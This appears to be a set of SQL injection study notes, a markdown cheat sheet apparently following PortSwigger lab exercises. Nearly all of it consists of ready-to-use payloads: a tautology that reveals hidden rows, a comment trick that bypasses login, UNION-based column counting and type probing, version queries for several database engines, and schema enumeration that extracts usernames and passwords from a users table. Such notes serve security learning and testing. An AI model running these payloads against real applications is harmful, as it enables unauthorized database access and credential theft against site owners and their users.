

### The Retrival of Hidden Data using the WHERE clause
```sql
' or 1=1 --
```

### SQL injection - Login functionality
```sql
administrator' --
```

### Union bases SQL Injection

**Rule:**
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

**SQLi attack (way #1):**
```sql
' UNION select NULL, NULL, NULL --
```

**SQLi attack (way #2):**
```sql
' ORDER BY 3 --
```
**MYSQL and Microsoft**
```sql
' ORDER BY 3#
```

(1) Find the number of columns that the vulnerable app is using:
' order by 1-- -> not displayed on the page
' order by 2-- -> displayed on the page
' order by 3-- -> internal server error

3 - 1 = 2

(2) Determine the Data type of the Columns
```sql
' UNION SELECT 'a', NULL--
```
```sql
' UNION SELECT NULL, 'a'-- ->**
```
```sql
' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database
```

(3) Output data from other tables

```sql
' UNION select NULL, username from users--
```
```sql
' UNION select NULL, password from users--
```

**For PostgreSQL Database**
```sql
' UNION select NULL, version()--
```
**For Oracle Database**
```sql
' UNION SELECT banner, NULL from v$version--
```

**For MySQL and MSSQL**
```sql
' UNION SELECT @@version, NULL#
```

Check the [Portswigger Database Cheetsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for the database version syntax for other databases

```sql
' UNION select NULL, username || '*' || password from users--
```

### Output the List of Table Names on Non-Oracle Databases
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

### Output the column names of the table on Non-Oracle Database
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name'--
```
### Output the List of Table Names on Oracle Databases
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```
### Output the column names of the users table on Oracle Database
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name'-- 
```

